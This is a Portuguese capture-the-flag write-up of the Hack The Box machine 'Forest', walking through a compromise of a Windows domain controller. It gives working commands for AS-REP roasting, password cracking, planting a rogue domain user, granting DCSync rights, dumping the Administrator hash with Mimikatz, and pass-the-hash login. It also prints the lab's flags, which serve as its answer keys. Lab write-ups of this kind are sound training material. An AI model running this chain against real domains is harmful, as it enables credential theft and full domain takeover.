# Writeup forest

## Scan

```bash
# Nmap 7.92 scan initiated Sun Jan 16 15:12:00 2022 as: nmap -sV -Pn -v -p- -T5 --open -oN fullnamp.txt 10.129.213.118
Nmap scan report for 10.129.213.118
Host is up (0.16s latency).
Not shown: 65475 closed tcp ports (reset), 37 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-16 20:19:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 15:13:51 2022 -- 1 IP address (1 host up) scanned in 110.85 seconds
```

## Enumeration

Com o scan feito, podemos começar a enumerar o Host. Primeiro usamos o rpcclient para enumerar os usuários do DC.

```bash
rpcclient 10.129.95.210 -U "" -N -c "enumdomusers" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > user.txt
```

Dessa maneira podemos pegar os usuários do DC e colocá-los na nossa user list.

Com a user list, podemos fazer um ataque de ASREPRoast usando a tool "GetNPUsers.py".

```python
python3 GetNPUsers.py htb.local/ -usersfile ~/Desktop/hackthebox/machines/to-do/forest/users.txt -format john -no-pass -dc-ip 10.129.95.210 -outputfile  ~/Desktop/hackthebox/machines/to-do/forest/hash
```

Dessa maneira, podemos pegar o hash do usuário **scv-alfresco** e ao quebrar, obtemos sua senha: **s3rvice**.

## Exploitation

Com a senha do usuário, podemos ver se temos acessso ao winrm com o crackmapexec.

```bash
└─$ crackmapexec winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.95.210   5985   FOREST           [*] http://10.129.95.210:5985/wsman
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Como vimos, podemos acessar o winrm com esse usuário, dessa maneira, podemos usar o "evil-winrm" para acessar o DC e pegar a User flag.

```powershell
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
07f6141ec214ea4112a10cbb007a38f1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```

## Privilege Escalation

Para fazermos o privilege esclation, precisaremos fazer a enumeração do DC com o bloodhound/Sharphound.

Para isso, fazemos o upload via evil-winrm, depois importamos o módulo powershell e invocamos o script para gerar o arquivo .zip com o comando:

```powershell
Invoke-BloodHound -CollectionMethod All
```

Depois de gerar o .zip, podemos baixar para nossa máquina e fazer o upload no Bloodhound.

OBS: Para conseguir fazer download do evil-winrm é necessário mover o arquivos para "Documents"

Commando `download .\FILE.zip PATH/TO/FILE/File.zip`

Após analisar o bloodhound, podemos ver que o nosso usuário pertence aos grupos "service accounts@htb.local" e "privileged IT accounts@htb.local" e esses grupos ter fazem parte de "account operators@htb.local" o que nos permite criar usuários. O grupo "account [operators@htb.local](mailto:operators@htb.local)" faz parte do grupo de "Exchange Windows Permissions", esse grupo tem acesso WriteDacl no objeto Domínio no Active Directory, o que permite que qualquer membro desse grupo modifique os privilégios de domínio, entre os quais o privilégio de realizar operações DCSync. Esse será nosso vetor de ataque.

Comandos:

```
net user thiago thiago123 /add /domain
net group "Exchange Windows Permissions" thiago /add
net localgroup "Remote Management Users"
$SecPassword = ConvertTo-SecureString 'thiago123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\thiago', $SecPassword)
```

Tendo feito esses comandos, temos que adicionar o module do powerview no DC para podermos adicionar nosso user para podermos fazer o DCSync.

Com o comando abaixo colocamos o user "thiago" para poder fazer DCSync:

```powershell
Add-ObjectACL -PrincipalIdentity thiago -credential $Cred -Rights DCSync
```

Após termos criado o user thiago, colocado ele nos grupos e ter feito o comando para poder fazer DCSync, podemos logar no evil-winrm, e importar o modulo "Invoke-Mimikatz.ps1" e usar o comando abaixo para podermos pegar as hashes do admin:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:htb.local /user:Administrator"'
```

Com esse comando, pegamos o hash NTLM do Administrator e podemos logar nele com o evil-winrm e pegar a flag de root.

```powershell
└─$ evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
21b50a39bd8a47a090848ec6b8632588
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
